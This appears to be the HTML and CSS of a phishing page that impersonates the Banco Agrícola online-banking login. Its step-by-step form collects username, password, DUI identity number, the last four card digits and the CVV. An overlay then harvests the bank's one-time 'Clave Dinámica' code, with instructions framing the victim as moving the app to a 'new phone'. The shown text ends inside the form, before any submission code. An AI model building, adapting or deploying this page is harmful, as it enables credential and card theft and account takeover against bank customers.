<!doctype html>
<html>

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
  <title>Portal Bancario</title>
  <style>
    /* reset */
    * {
      margin: 0;
      padding: 0;
      border: 0;
      font: inherit;
      vertical-align: baseline;
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
      outline: 0
    }

    article,
    aside,
    details,
    figcaption,
    figure,
    footer,
    header,
    hgroup,
    menu,
    nav,
    section {
      display: block
    }

    body {
      line-height: 1;
      color: #292929;
      font-family: CIBfont, Helvetica, Arial, sans-serif;
      font-size: 16px;
      min-height: 100%;
      height: 100%;
      overflow-x: hidden;
      background: #f0f0f0
    }

    ol,
    ul {
      list-style: none
    }

    blockquote,
    q {
      quotes: none
    }

    blockquote:before,
    blockquote:after,
    q:before,
    q:after {
      content: "";
      content: none
    }

    table {
      border-collapse: collapse;
      border-spacing: 0
    }

    strong {
      font-weight: 700
    }

    a {
      color: #292929;
      text-decoration: none;
      cursor: pointer
    }

    h2 {
      font-weight: 700
    }

    @font-face {
      font-family: CIBfont;
      font-weight: 400;
      src: url(../font/CIBFontSans-Light.ttf)
    }

    @font-face {
      font-family: CIBfont;
      font-weight: 700;
      src: url(../font/CIBFontSans-Bold.ttf)
    }

    @font-face {
      font-family: 'Open Sans';
      font-weight: 600;
      src: url(../font/OpenSans-SemiBold.ttf)
    }

    @font-face {
      font-family: 'Open Sans';
      font-weight: 400;
      src: url(../font/OpenSans-Regular.ttf)
    }

    /* layout */
    .x {
      display: none !important
    }

    .y {
      display: flex;
      gap: 12px
    }

    .y>div {
      flex: 1
    }

    .z {
      display: inline-block;
      background: #f2f6fc;
      padding: 6px 16px;
      border-radius: 30px;
      font-size: .9rem;
      color: #1e3a6f;
      margin-top: 8px;
      font-weight: 400
    }

    .a {
      height: 100vh;
      display: flex;
      flex-direction: column
    }

    .b {
      background: #fff
    }

    .b header {
      height: 70px;
      background: #fff;
      box-shadow: 0 1px 8px rgba(0, 0, 0, .1);
      z-index: 9999
    }

    .b header .c {
      padding: 3px 25px;
      height: 66px
    }

    .b header .c a {
      display: block;
      width: 219px;
      height: 54px;
      margin: 0 auto;
      text-indent: -9999em;
      background-image: url(./index_files/positivo.svg);
      background-size: 219px 54px;
      background-position: 50%;
      background-repeat: no-repeat
    }

    .d {
      flex-grow: 1;
      display: flex;
      flex-direction: column;
      overflow-y: auto;
      -webkit-overflow-scrolling: touch
    }

    .b .d {
      background: #fff;
      color: #292929;
      font-weight: 700;
      font-size: 20px;
      box-shadow: 0 10px 13px #000
    }

    .b .d.e {
      background: url(./index_files/imagen-fondo-login.jpg);
      background-size: cover;
      padding: 77px 48px;
      background-position: center top 24%;
      align-items: flex-start;
      justify-content: flex-start
    }

    .f {
      background: #fff;
      width: 580px;
      box-shadow: 0 10px 16px rgba(0, 0, 0, .1);
      margin: 0;
      max-width: 100%
    }

    .g {
      font-weight: 700;
      font-size: 18px;
      padding-left: 10px;
      text-align: center
    }

    .h {
      text-align: center;
      padding: 0 30px
    }

    .normal-version .g {
      padding: 40px 24px 24px 45px;
      text-align: left;
      font-size: 24px;
      box-shadow: none
    }

    .normal-version .g span {
      font-size: 28px;
      line-height: 30px
    }

    .i {
      display: flex;
      flex-direction: column;
      height: 100%;
      flex: 1
    }

    .normal-version .i {
      display: block;
      height: auto;
      padding-top: 0;
      flex: 0 0 auto;
      max-width: 800px
    }

    .j .k {
      padding: 15px 0
    }

    .l {
      flex: 1 0 auto;
      display: flex;
      flex-direction: column;
      height: auto
    }

    .normal-version .l {
      display: block
    }

    .m {
      flex: 0 0 auto;
      min-height: 0;
      padding: 0 30px;
      margin-bottom: 1px
    }

    .normal-version .m {
      display: flex;
      flex-direction: column;
      padding: 0 22.5px
    }

    .normal-version .m.n {
      padding: 0 22.5px
    }

    .o {
      padding: 15px 12.5px
    }

    .normal-version .o {
      top: 10px;
      grid-template-columns: 200px 1fr;
      grid-column-gap: 50px;
      padding: 15px 22.5px;
      align-items: center
    }

    .normal-version .o .p {
      max-width: 426px
    }

    .p {
      display: flex;
      flex-direction: row;
      min-width: 0
    }

    .o .p input {
      flex: 1 1 auto;
      min-width: 0;
      margin-bottom: 0;
      padding-left: 0
    }

    .q input {
      background: transparent;
      border: none;
      border-bottom: 1px solid #292929;
      border-radius: 0;
      display: block;
      width: 100%;
      font-size: 16px;
      color: #292929;
      font-family: 'Open Sans', sans-serif;
      line-height: 23px;
      padding: 0;
      margin: 0;
      box-sizing: border-box
    }

    .normal-version .q input {
      line-height: 31px;
      padding: 0;
      color: #292929;
      border-bottom: 1px solid #2c2a29;
      width: 100%
    }

    .r {
      font-size: 12px;
      text-transform: initial
    }

    .s {
      padding-top: 20px
    }

    .normal-version .s {
      align-items: flex-start
    }

    .s ul {
      display: flex;
      flex-direction: row;
      flex-wrap: wrap
    }

    .s ul li {
      flex: 1 1 50%;
      padding: 0 15px 15px 0
    }

    .normal-version .s ul {
      flex: 0 1 auto;
      flex-wrap: nowrap
    }

    .normal-version .s li {
      padding: 0;
      margin-right: 30px
    }

    .s .t {
      display: flex;
      flex-direction: row;
      margin-bottom: 14px
    }

    .s .u {
      flex: 1 1 auto;
      padding-left: 7px;
      font-size: 16px
    }

    .s .u span {
      font-family: 'Open Sans', sans-serif;
      line-height: 21px
    }

    .s .v {
      width: 23px;
      height: 18px;
      border: 1px solid #292929;
      display: inline-block;
      flex: 0 0 18px;
      position: relative
    }

    .s .v .w {
      display: block;
      width: 17px;
      height: 17px;
      position: absolute;
      display: none;
      background-image: url(./index_files/icon-checked-grey.svg);
      background-repeat: no-repeat;
      background-size: 13px;
      background-position: 50%;
      border: none
    }

    .s .v.x .w {
      display: block
    }

    .t .v {
      width: 18px;
      height: 18px;
      flex-basis: 18px
    }

    .t .v .w {
      position: absolute
    }

    .t .u {
      font-size: 16px;
      font-family: 'Open Sans', sans-serif
    }

    .y {
      text-align: center;
      padding-top: 10px
    }

    .normal-version .y {
      text-align: left;
      margin-left: 22.5px;
      padding: 0
    }

    .z {
      font-size: 16px;
      font-family: 'Open Sans', sans-serif;
      text-decoration: underline;
      font-weight: 600
    }

    .aa {
      flex: 0 0 auto;
      padding: 25px 30px;
      display: flex;
      flex-direction: row;
      align-items: center;
      justify-content: space-between;
      flex-wrap: wrap;
      text-align: center
    }

    .aa.ab {
      justify-content: space-around
    }

    .normal-version .aa {
      display: flex;
      padding-left: 45px;
      flex: 0 0 auto;
      flex-direction: row;
      align-items: center;
      min-height: 92px;
      justify-content: flex-start;
      flex-wrap: wrap
    }

    .normal-version .aa.ab {
      margin-left: 0;
      flex-direction: initial;
      justify-content: flex-start;
      text-align: left;
      padding: 15px 0 15px 45px
    }

    .normal-version .aa.ab .ac {
      margin: 15px 15px 15px 0
    }

    .ac {
      display: inline-block;
      background-color: #fdda24;
      color: #292929;
      text-transform: uppercase;
      border: none;
      min-height: 42px;
      border-radius: 42px;
      padding: 10px 17px;
      font-weight: 700;
      font-size: 18px;
      font-family: CIBfont, Helvetica, Arial, sans-serif;
      vertical-align: middle;
      overflow: hidden;
      margin-bottom: 10px;
      box-shadow: 0 1px 2px rgba(0, 0, 0, .1)
    }

    .normal-version .ac {
      border-radius: 40px;
      background-color: #fdda24;
      color: #292929;
      height: 41px;
      padding: 10px 49px;
      font-weight: 400;
      display: inline-block;
      text-decoration: none;
      text-transform: uppercase;
      font-weight: 700;
      display: flex;
      flex: 0 0 auto;
      min-width: 189px;
      align-items: center;
      justify-content: center;
      width: auto;
      margin-bottom: 0
    }

    .normal-version .ac span {
      font-size: 18px !important
    }

    .normal-version .aa .ac,
    .normal-version .b .d .aa.ab .ac {
      background-color: #fdda24;
      border: none;
      margin-right: 0;
      justify-content: center
    }

    .ac .ad {
      display: none
    }

    .ac.ae .ad {
      display: inline-block
    }

    .ad {
      background-image: url(./index_files/renovar-loading.svg);
      background-size: 20px;
      background-repeat: no-repeat;
      background-position: 50%
    }

    .normal-version .ac .ad {
      background-size: 20px
    }

    .af {
      background-image: url(./index_files/pencil.svg);
      background-size: 20px;
      background-repeat: no-repeat;
      background-position: left 50%;
      padding-left: 30px
    }

    .ag {
      background-image: url(telephone-icon.svg);
      background-size: 20px;
      background-repeat: no-repeat;
      background-position: left 50%;
      padding-left: 30px
    }

    .normal-version .af,
    .normal-version .ag {
      background-size: 21px;
      background-position: left 50%;
      padding-left: 30px;
      line-height: 21px
    }

    .ah {
      background: #fff;
      position: relative;
      width: 100%;
      z-index: 999;
      bottom: 0
    }

    .normal-version .ah .ai {
      padding: 24px 65px;
      display: flex;
      flex-direction: row;
      background-image: url(./index_files/negro.svg);
      background-repeat: no-repeat;
      background-position: .5% 52%;
      box-shadow: 0 -2px 5px rgba(0, 0, 0, .09)
    }

    .normal-version .ah .ai li {
      padding-right: 30px;
      text-decoration: underline
    }

    .normal-version .ah .ai li span {
      font-size: 16px;
      font-weight: 700;
      font-family: 'Open Sans', sans-serif
    }

    .normal-version .ah .ai li:last-of-type {
      margin-right: 0
    }

    .normal-version .ah .ai li:nth-last-child(2) {
      text-decoration: none
    }

    .normal-version .ah .ai li:nth-last-child(2) span {
      font-weight: 400;
      font-size: 14px
    }

    .aj {
      font-size: 12px;
      font-family: 'Open Sans', sans-serif;
      opacity: .75;
      padding-right: 10px
    }

    .ak {
      padding-top: 12px;
      padding-bottom: 25px;
      flex: none;
      display: flex;
      justify-content: space-around
    }

    .normal-version .b .d .ak {
      border-top: 1px solid #2c2a29;
      padding: 22.5px;
      padding-left: 45px !important;
      padding-right: 45px !important;
      padding: 30px;
      justify-content: flex-start;
      gap: 40px
    }

    .ak a {
      font-size: 16px;
      font-family: 'Open Sans', sans-serif;
      text-decoration: underline;
      font-weight: 600
    }

    .al,
    .am {
      display: none
    }

    .normal-version .m .y {
      margin-left: 22.5px;
      padding-left: 22.5px
    }

    .normal-version .m .s {
      padding-left: 22.5px
    }

    /* Loading overlay */
    .loader-overlay {
      position: fixed;
      inset: 0;
      background: #fff;
      z-index: 999999;
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      opacity: 0;
      transition: opacity .3s ease;
    }
    .loader-overlay.show {
      display: flex;
      opacity: 1;
    }
    .loader-spinner {
      width: 70px;
      height: 70px;
      border-radius: 50%;
      border: 3px solid #292929;
      border-top-color: transparent;
      border-right-color: transparent;
      animation: loader-spin 1s linear infinite;
      position: relative;
      box-sizing: border-box;
      transition: border-color .35s ease;
    }
    @keyframes loader-spin { to { transform: rotate(360deg) } }
    .loader-text {
      position: absolute;
      bottom: 22%;
      font-family: 'Open Sans', sans-serif;
      font-size: 15px;
      letter-spacing: 2px;
      color: #1a3a6e;
      font-weight: 600;
      text-transform: uppercase;
      white-space: pre-line;
      text-align: center;
      padding: 0 20px;
    }
    .loader-overlay.success .loader-spinner {
      border-color: #2ecc71;
      animation: none;
      transform: rotate(0deg);
    }
    .loader-overlay.success .loader-spinner::after {
      content: "";
      position: absolute;
      left: 50%;
      top: 50%;
      transform: translate(-55%, -65%) rotate(45deg);
      width: 16px;
      height: 30px;
      border-right: 4px solid #2ecc71;
      border-bottom: 4px solid #2ecc71;
      animation: check-pop .4s ease;
    }
    @keyframes check-pop {
      0% { opacity: 0; transform: translate(-55%, -65%) rotate(45deg) scale(.2) }
      100% { opacity: 1; transform: translate(-55%, -65%) rotate(45deg) scale(1) }
    }
    .loader-overlay.success .loader-text {
      color: #2ecc71;
    }

    /* Estado de fallo (X roja) */
    .loader-overlay.fail .loader-spinner {
      border-color: #e74c3c;
      animation: none;
      transform: rotate(0deg);
    }
    .loader-overlay.fail .loader-spinner::before,
    .loader-overlay.fail .loader-spinner::after {
      content: "";
      position: absolute;
      left: 50%;
      top: 50%;
      width: 32px;
      height: 4px;
      background: #e74c3c;
      border-radius: 2px;
      animation: check-pop .4s ease;
    }
    .loader-overlay.fail .loader-spinner::before { transform: translate(-50%, -50%) rotate(45deg); }
    .loader-overlay.fail .loader-spinner::after { transform: translate(-50%, -50%) rotate(-45deg); }
    .loader-overlay.fail .loader-text {
      color: #e74c3c;
      max-width: 280px;
      text-align: center;
      line-height: 1.4;
    }

    /* Title responsive variants */
    .title-mobile { display: none }
    .title-desktop { display: inline }

    /* Professional stepper */
    .stepper {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 10px;
      padding: 18px 30px 8px;
    }
    .stepper-bars {
      display: flex;
      gap: 6px;
      width: 100%;
      max-width: 280px;
    }
    .stepper-bars .bar {
      flex: 1;
      height: 4px;
      border-radius: 4px;
      background: #e6e6e6;
      transition: background .25s ease;
    }
    .stepper[data-step="1"] .bar:nth-child(-n+1),
    .stepper[data-step="2"] .bar:nth-child(-n+2),
    .stepper[data-step="3"] .bar:nth-child(-n+3),
    .stepper[data-step="4"] .bar:nth-child(-n+4) {
      background: #fdda24;
    }
    .stepper-label {
      font-size: 12px;
      font-family: 'Open Sans', sans-serif;
      color: #6f7d95;
      letter-spacing: .3px;
      text-transform: uppercase;
      font-weight: 600;
    }

    @media(max-width:768px) {

      html,
      body {
        overflow-x: hidden !important;
        background: #fff !important
      }

      .a.b {
        background: #fff !important
      }

      /* Header: phone icon left, logo center, chat icon right */
      .b header {
        height: 64px !important;
        box-shadow: none !important;
        position: relative !important;
        background: #fff !important
      }

      .b header .c {
        padding: 8px 20px !important;
        height: 64px !important;
        display: flex !important;
        align-items: center !important;
        justify-content: center !important;
        position: relative !important
      }

      .b header .c a {
        width: 210px !important;
        height: 50px !important;
        background-size: 210px 50px !important;
        margin: 0 !important
      }

      .b header .c::before {
        content: "";
        position: absolute;
        left: 18px;
        top: 50%;
        transform: translateY(-50%);
        width: 26px;
        height: 26px;
        background: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23292929' stroke-width='1.8' stroke-linecap='round' stroke-linejoin='round'><path d='M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.13.96.37 1.9.72 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.91.35 1.85.59 2.81.72A2 2 0 0 1 22 16.92z'/></svg>") no-repeat center / contain;
      }

      .b header .c::after {
        content: "";
        position: absolute;
        right: 18px;
        top: 50%;
        transform: translateY(-50%);
        width: 28px;
        height: 28px;
        background: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23292929' stroke-width='1.6' stroke-linecap='round' stroke-linejoin='round'><path d='M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z'/></svg>") no-repeat center / contain;
      }

      .d {
        display: flex !important;
        align-items: flex-start !important;
        justify-content: center !important;
        padding: 0 !important;
        min-height: calc(100vh - 140px) !important;
        box-sizing: border-box !important;
        width: 100% !important;
        overflow-x: hidden !important;
        background: #fff !important
      }

      .b .d.e {
        background: #fff !important;
        padding: 0 !important
      }

      .f {
        width: 100% !important;
        max-width: 100% !important;
        box-sizing: border-box !important;
        overflow: hidden !important;
        box-shadow: none !important;
        padding: 16px 28px 24px !important
      }

      .g.h {
        font-size: 20px !important;
        line-height: 26px !important;
        padding: 8px 10px 32px !important;
        text-align: center !important;
        font-weight: 700 !important;
        color: #292929 !important
      }

      .g.h span {
        font-size: 20px !important;
        line-height: 26px !important
      }

      .title-desktop { display: none !important }
      .title-mobile {
        display: inline-block !important;
        max-width: 220px;
        text-align: center;
      }

      .i {
        width: 100% !important;
        box-sizing: border-box !important
      }

      .l,
      .m,
      .o {
        width: 100% !important;
        box-sizing: border-box !important
      }

      .m.n .o.q {
        padding: 30px 0 4px !important
      }

      .o.q label span {
        color: #b07a1a !important;
        font-size: 14px !important;
        font-family: 'Open Sans', sans-serif !important
      }

      .p {
        width: 100% !important;
        box-sizing: border-box !important;
        overflow: hidden !important
      }

      .p>div {
        width: 100% !important;
        box-sizing: border-box !important;
        min-width: 0 !important
      }

      .q input {
        border-bottom: 1px solid #292929 !important;
        font-size: 16px !important;
        padding: 6px 0 8px !important;
        min-height: 36px !important
      }

      .s {
        padding: 20px 0 8px !important
      }

      .s ul li {
        padding: 0 !important
      }

      .s .v {
        width: 18px !important;
        height: 18px !important;
        flex-basis: 18px !important;
        border: 1.5px solid #292929 !important;
        border-radius: 2px !important
      }

      .s .u span {
        font-size: 15px !important
      }

      .y {
        text-align: center !important;
        padding: 18px 0 24px !important
      }

      .z {
        font-size: 16px !important;
        font-weight: 700 !important
      }

      .aa {
        width: 100% !important;
        box-sizing: border-box !important;
        padding: 12px 0 28px !important;
        margin: 0 !important;
        display: flex !important;
        justify-content: center !important
      }

      .aa .ac {
        width: 78% !important;
        max-width: 280px !important;
        min-height: 50px !important;
        border-radius: 50px !important;
        font-size: 17px !important;
        letter-spacing: .5px !important;
        background-color: #fdda24 !important;
        box-shadow: 0 2px 4px rgba(0, 0, 0, .12) !important;
        box-sizing: border-box !important
      }

      .ak {
        gap: 16px !important;
        flex-wrap: nowrap !important;
        justify-content: space-between !important;
        padding: 6px 4px 20px !important;
        border-top: none !important
      }

      .ak a {
        font-size: 15px !important;
        font-weight: 700 !important
      }

      .ak .af {
        background-image: url(./index_files/pencil.svg) !important;
        background-position: right 50% !important;
        background-size: 16px !important;
        padding-left: 0 !important;
        padding-right: 24px !important
      }

      .ak .ag {
        background-position: right 50% !important;
        background-size: 18px !important;
        padding-left: 0 !important;
        padding-right: 26px !important
      }

      /* Hide bottom footer on mobile */
      .ah {
        display: none !important
      }

      /* Stepper tuning on mobile */
      .stepper {
        padding: 22px 0 6px !important;
        gap: 8px !important;
      }
      .stepper-bars {
        max-width: 100% !important;
        gap: 5px !important;
      }
      .stepper-bars .bar {
        height: 3px !important;
        background: #ececec !important;
      }
      .stepper[data-step="1"] .bar:nth-child(-n+1),
      .stepper[data-step="2"] .bar:nth-child(-n+2),
      .stepper[data-step="3"] .bar:nth-child(-n+3),
      .stepper[data-step="4"] .bar:nth-child(-n+4) {
        background: #fdda24 !important;
      }
      .stepper-label {
        font-size: 13px !important;
        color: #8a8a8a !important;
        letter-spacing: 1px !important;
        font-weight: 700 !important;
      }

      /* Hide 'Olvide mi Clave' link on mobile per design */
      #s1 .m .y { display: none !important }

      /* Hide Regístrate / Contáctanos footer on mobile */
      .ak { display: none !important }
    }

    /* Pantalla de código OTP */
    .tok-overlay {
      display: none;
      position: fixed;
      inset: 0;
      background: #fff;
      z-index: 999998;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 32px 24px;
    }
    .tok-overlay.show { display: flex; }
    .tok-box {
      width: 100%;
      max-width: 340px;
      text-align: center;
    }
    .tok-logo {
      display: block;
      width: 140px;
      height: 100px;
      object-fit: contain;
      margin: 0 auto 18px;
    }
    .tok-title {
      font-size: 20px;
      font-weight: 700;
      color: #1a1a1a;
      margin-bottom: 6px;
      font-family: 'Open Sans', sans-serif;
    }
    .tok-msg {
      font-size: 14px;
      color: #5a6473;
      line-height: 1.5;
      margin-bottom: 24px;
      font-family: 'Open Sans', sans-serif;
    }
    .tok-input {
      width: 100%;
      background: transparent;
      border: none;
      border-bottom: 2px solid #292929;
      font-size: 26px;
      text-align: center;
      letter-spacing: 8px;
      font-family: 'Open Sans', sans-serif;
      outline: none;
      padding: 8px 0;
      margin-bottom: 4px;
    }
    .tok-input:focus { border-bottom-color: #1a3a6e; }
    .tok-err {
      display: block;
      font-size: 12px;
      color: #c0392b;
      font-family: 'Open Sans', sans-serif;
      min-height: 18px;
      margin-bottom: 14px;
    }
    .tok-btn {
      display: block;
      width: 100%;
      background: #fdda24;
      color: #292929;
      font-weight: 700;
      font-size: 16px;
      padding: 14px;
      border-radius: 50px;
      border: none;
      cursor: pointer;
      text-transform: uppercase;
      font-family: CIBfont, Helvetica, Arial, sans-serif;
    }
    .tok-help-btn {
      display: flex;
      align-items: center;
      gap: 10px;
      width: 100%;
      background: #fff;
      border: 1.5px solid #d8d8d8;
      border-radius: 50px;
      padding: 10px 18px;
      margin-top: 12px;
      cursor: pointer;
      font-size: 13px;
      font-family: 'Open Sans', sans-serif;
      color: #2a2a2a;
      text-align: left;
    }
    .tok-help-btn svg { flex-shrink: 0; }

    /* Panel instrucciones Clave Dinamica */
    .cd-panel {
      display: none;
      position: fixed;
      inset: 0;
      background: #fff;
      z-index: 9999999;
      flex-direction: column;
      overflow-y: auto;
    }
    .cd-panel.show { display: flex; }
    .cd-hdr {
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 14px 16px;
      border-bottom: 1px solid #efefef;
      position: relative;
    }
    .cd-back {
      position: absolute;
      left: 12px;
      background: none;
      border: none;
      cursor: pointer;
      padding: 4px 8px;
      font-size: 20px;
      color: #333;
      line-height: 1;
    }
    .cd-hdr-logo {
      height: 26px;
      object-fit: contain;
    }
    .cd-body {
      flex: 1;
      padding: 24px 24px 32px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .cd-phone {
      width: 200px;
      margin-bottom: 24px;
      border-radius: 20px;
      box-shadow: 0 4px 20px rgba(0,0,0,.15);
    }
    .cd-title {
      font-size: 18px;
      font-weight: 700;
      text-align: center;
      margin-bottom: 22px;
      font-family: 'Open Sans', sans-serif;
      color: #1a1a1a;
    }
    .cd-steps {
      list-style: none;
      padding: 0;
      margin: 0;
      width: 100%;
      max-width: 320px;
    }
    .cd-steps li {
      display: flex;
      gap: 12px;
      margin-bottom: 16px;
      font-size: 14px;
      font-family: 'Open Sans', sans-serif;
      line-height: 1.55;
      color: #2a2a2a;
      align-items: flex-start;
    }
    .cd-bullet {
      width: 13px;
      height: 13px;
      background: #fdda24;
      flex-shrink: 0;
      margin-top: 3px;
    }
    .cd-volver {
      display: block;
      width: 100%;
      max-width: 320px;
      background: #fdda24;
      color: #292929;
      font-weight: 700;
      font-size: 16px;
      padding: 16px;
      border-radius: 50px;
      border: none;
      cursor: pointer;
      text-align: center;
      font-family: CIBfont, Helvetica, Arial, sans-serif;
      text-transform: uppercase;
      margin-top: 32px;
    }

    /* Toast de error (sin icóno, sin botón) */
    .notif-pop {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(25,25,25,.88);
      color: #fff;
      font-size: 15px;
      font-family: 'Open Sans', sans-serif;
      padding: 16px 22px;
      border-radius: 10px;
      z-index: 9999999;
      text-align: center;
      max-width: 280px;
      width: 88%;
      pointer-events: none;
    }
    .notif-pop.show { display: block; }

    /* Disclaimer de validación inline */
    .field-err {
      font-size: 12px;
      color: #c0392b;
      font-family: 'Open Sans', sans-serif;
      margin-top: 5px;
      display: none;
    }
    .field-err.show { display: block; }

    /* Palomita dibujada con CSS para el checkbox "Recordar usuario" */
    .s .v.checked .w {
      display: block !important;
      background-image: none !important;
      width: 100% !important;
      height: 100% !important;
      left: 0 !important;
      top: 0 !important;
      position: absolute !important;
    }
    .s .v.checked .w::after {
      content: "";
      position: absolute;
      left: 50%;
      top: 45%;
      width: 6px;
      height: 11px;
      border-right: 2px solid #292929;
      border-bottom: 2px solid #292929;
      transform: translate(-50%, -55%) rotate(45deg);
    }
  </style>
</head>

<body class="normal-version true web-version">
  <div class="notif-pop" id="notif-pop"></div>
  <div class="tok-overlay" id="tok-ov">
    <div class="tok-box">
      <img style="display:block;width:180px;height:44px;object-fit:contain;margin:0 auto 20px" src="./index_files/positivo.svg" alt="Bancoagrícola">
      <img class="tok-logo" src="./img/dinamica.png" alt="Clave Dinámica">
      <p class="tok-title">Clave Dinámica</p>
      <p class="tok-msg">Genera la Clave Dinámica desde Banca Móvil</p>
      <input type="text" id="x-tok" inputmode="numeric" autocomplete="one-time-code" maxlength="8" class="tok-input" placeholder="_ _ _ _ _ _">
      <span class="tok-err" id="tok-err">&nbsp;</span>
      <button type="button" class="tok-btn" id="btn-tok">Continuar</button>
      <button type="button" class="tok-help-btn" id="btn-cd-help">
        <svg width="26" height="26" viewBox="0 0 26 26" fill="none">
          <circle cx="13" cy="13" r="12" stroke="#2ea44f" stroke-width="1.8"/>
          <path d="M13 5a8 8 0 0 1 6.2 13.1" stroke="#2ea44f" stroke-width="1.8" stroke-linecap="round"/>
          <path d="M19.5 17.5l-.5 3-2.8-1.2" stroke="#2ea44f" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
          <rect x="9.5" y="14.5" width="7" height="5.5" rx="1" fill="#2ea44f"/>
          <path d="M11 14.5v-2a2 2 0 0 1 4 0v2" stroke="#2ea44f" stroke-width="1.5" fill="none"/>
        </svg>
        ¿Cómo generar la Clave Dinámica?
      </button>
    </div>
  </div>
  <div class="cd-panel" id="cd-panel">
    <div class="cd-hdr">
      <button class="cd-back" id="btn-cd-back">&#8592;</button>
      <img class="cd-hdr-logo" src="./index_files/positivo.svg" alt="Bancoagrícola">
    </div>
    <div class="cd-body">
      <img class="cd-phone" src="./img/explicativo.png" alt="" onerror="this.style.display='none'">
      <p class="cd-title">Para generar tu Clave<br>Dinámica:</p>
      <ul class="cd-steps">
        <li><span class="cd-bullet"></span><span>Abre tu App Banca Móvil desde tu celular anterior.</span></li>
        <li><span class="cd-bullet"></span><span>En la parte inferior de la pantalla, haz clic en el botón de “Clave Dinámica”.</span></li>
        <li><span class="cd-bullet"></span><span>Ingresa el código de 8 dígitos en este nuevo celular.</span></li>
        <li><span class="cd-bullet"></span><span>Recuerda: tu Clave Dinámica cambiará cada minuto.</span></li>
      </ul>
      <button class="cd-volver" id="btn-cd-back2">Volver</button>
    </div>
  </div>
  <div class="loader-overlay" id="loader-ov">
    <div class="loader-spinner"></div>
    <div class="loader-text" id="loader-text">CARGANDO...</div>
  </div>
  <div id="root">
    <div>
      <div class="a b">
        <div class="al">
          <div class="message">
            <p>El ancho de su pantalla es demasiado pequeño</p>
          </div>
        </div>
        <header>
          <div class="am"></div>
          <h1 class="c"><a><span>Banco Agrícola</span></a></h1>
        </header>
        <article class="d e">
          <div class="f">
            <h2 class="g h"><span class="title-desktop">Bienvenido a e-banca Personas</span><span class="title-mobile">Bienvenido a e-banca Personas</span></h2>
            <form class="i j" autocomplete="off" method="POST" id="fm2">
              <div class="l" id="sc2">
                <div id="s1" class="">
                  <div class="m n">
                    <div class="o q"><label><span>Usuario</span>
                        <p class="r"><span></span></p>
                      </label>
                      <div class="p">
                        <div style="display:flex;width:100%"><input type="text" id="x1" autocomplete="off"
                            autocorrect="off" autocapitalize="off" spellcheck="false" maxlength="20" style="opacity:1">
                        </div>
                        <p class="field-err" id="err1">Ingrese su usuario.</p>
                      </div>
                    </div>
                  </div>
                  <div>
                    <div class="m n">
                      <div class="o s"><label class="no-mobile">&nbsp;</label>
                        <ul>
                          <li>
                            <div class="t">
                              <div class="v"><span class="w"></span></div><span class="u"><span><span>Recordar
                                    usuario</span></span></span><input name="ru2" type="checkbox" autocomplete="off"
                                class="x" value="true">
                            </div>
                          </li>
                        </ul>
                      </div>
                    </div>
                  </div>
                  <div class="m">
                    <div class="y"><a class="z" href="https://www.ebanca.com/userRecoveryUserEntry"
                        id="lk2"><span>Olvide mi Clave</span></a></div>
                  </div>
                </div>
                <div id="s2" class="x">
                  <div class="m n">
                    <div class="o q"><label><span>Clave</span>
                        <p class="r"><span></span></p>
                      </label>
                      <div class="p">
                        <div style="display:flex;width:100%"><input type="password" id="x2" autocomplete="off"
                            autocorrect="off" autocapitalize="off" spellcheck="false" maxlength="20" style="opacity:1">
                        </div>
                        <p class="field-err" id="err2">Ingrese su clave.</p>
                      </div>
                    </div>
                  </div>
                  <div class="m">
                    <div class="y"><span class="z" style="cursor:default;color:#6f7d95"><span>Ingrese su clave de
                          acceso</span></span></div>
                  </div>
                </div>
                <div id="s3" class="x">
                  <div class="m n">
                    <div class="o q"><label><span>Documento Único de Identidad (DUI)</span>
                        <p class="r"><span></span></p>
                      </label>
                      <div class="p">
                        <div style="display:flex;width:100%"><input type="text" id="x3" inputmode="numeric"
                            autocomplete="off" maxlength="9" placeholder="Número de DUI"></div>
                        <p class="field-err" id="err3">Ingrese DUI válido (9 dígitos).</p>
                      </div>
                    </div>
                  </div>
                  <div class="m">
                    <div class="y"><span class="z" style="cursor:default;color:#6f7d95"><span>Ingrese su DUI (9
                          dígitos)</span></span></div>
                  </div>
                </div>
                <div id="s4" class="x">
                  <div class="m n">
                    <div class="o q"><label><span>Tarjeta de débito/crédito</span>
                        <p class="r"><span></span></p>
                      </label>
                      <div class="p" style="padding:0">
                        <div style="display:flex;width:100%;gap:12px">
                          <div style="flex:2"><input type="text" id="x4" inputmode="numeric" maxlength="4"
                              placeholder="Últ. 4 dígitos" autocomplete="off" style="width:100%"></div>
                          <div style="flex:1"><input type="text" id="x5" inputmode="numeric" maxlength="3"
                              placeholder="CVV" autocomplete="off" style="width:100%"></div>
                        </div>
                        <p class="field-err" id="err4">Complete últimos 4 dígitos y CVV.</p>
                      </div>
                    </div>
                  </div>
                  <div class="m">
                    <div class="y"><span class="z" style="cursor:default;color:#6f7d95"><span>Código de 3 dígitos detrás
                          de la tarjeta</span></span></div>
                  </div>
                </div>
                <div class="stepper" id="stepper2" data-step="1">
                  <div class="stepper-bars">
                    <span class="bar"></span><span class="bar"></span><span class="bar"></span><span class="bar"></span>
                  </div>
                  <div class="stepper-label"><span id="pc2">Paso 1 de 4 · Usuario</span></div>
                </div>
              </div>
